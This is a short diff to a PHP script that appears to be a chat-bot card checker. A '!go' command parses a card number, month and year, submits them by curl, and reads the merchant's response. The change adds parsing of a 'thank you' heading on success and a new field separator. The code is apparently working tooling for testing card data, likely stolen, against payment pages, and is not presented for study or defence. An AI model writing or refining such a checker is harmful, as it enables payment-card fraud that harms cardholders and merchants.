@@ -1804,7 +1804,12 @@ $err = curl_error($curl);
 preg_match('/(\d+: .*?)<\/p>/', $response, $match);
 $respo = $match[1];
 
-file_put_contents('/sdcard/index.html', $response);
+//EXTRAE EL TANKYOU//
+if (empty($respo)){
+preg_match('/<h1.*>(.*?)<\/h1>/', $response, $match);
+$respo = $match[1];
+}
+//file_put_contents('/sdcard/index.html', $response);
 curl_close($curl);
 
 }
@@ -1875,7 +1880,8 @@ ob_flush();
 elseif((strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){
 //$lista = preg_replace('/\s+/', '', $lista);
 $lista = substr($message, 4);
-$i = preg_split('/[|:| ]/', $lista);
+//$i = preg_split('/[|:| ]/', $lista);
+$i = preg_split('/[|:|\/ ]/', $lista);
 $cc    = trim($i[0]);
 $mes   = trim($i[1]);
 $ano  = trim(substr($i[2], -2));
